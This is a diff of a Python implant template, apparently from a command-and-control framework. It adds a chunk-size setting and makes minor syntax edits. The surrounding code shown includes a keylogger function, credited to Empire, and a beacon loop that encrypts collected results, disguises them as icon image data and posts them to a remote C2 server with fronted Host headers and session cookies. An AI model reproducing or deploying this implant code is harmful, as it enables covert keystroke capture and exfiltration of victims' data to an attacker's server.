@@ -15,6 +15,7 @@ urls = [%s]
 kd=time.strptime("%s","%%d/%%m/%%Y")
 useragent = ""
 imbase = "%s"
+chunkSize = %s
 
 def keylog():
   # keylogger imported from https://raw.githubusercontent.com/EmpireProject/Empire/fcd1a3d32b4c37a392c59ffe241b9cb973fde7f4/lib/modules/python/collection/osx/keylogger.py
@@ -212,12 +213,15 @@ while(True):
             server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
             opener = urllib2.build_opener()
             postcookie = encrypt(key, taskId)
+
+
+
             data = base64.b64decode(random.choice(icoimage))
             dataimage = data.ljust( 1500, '\x00' )
             dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
             if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            res=urllib2.urlopen(req);
+            res=urllib2.urlopen(req)
             response = res.read()
 
       except Exception as e:
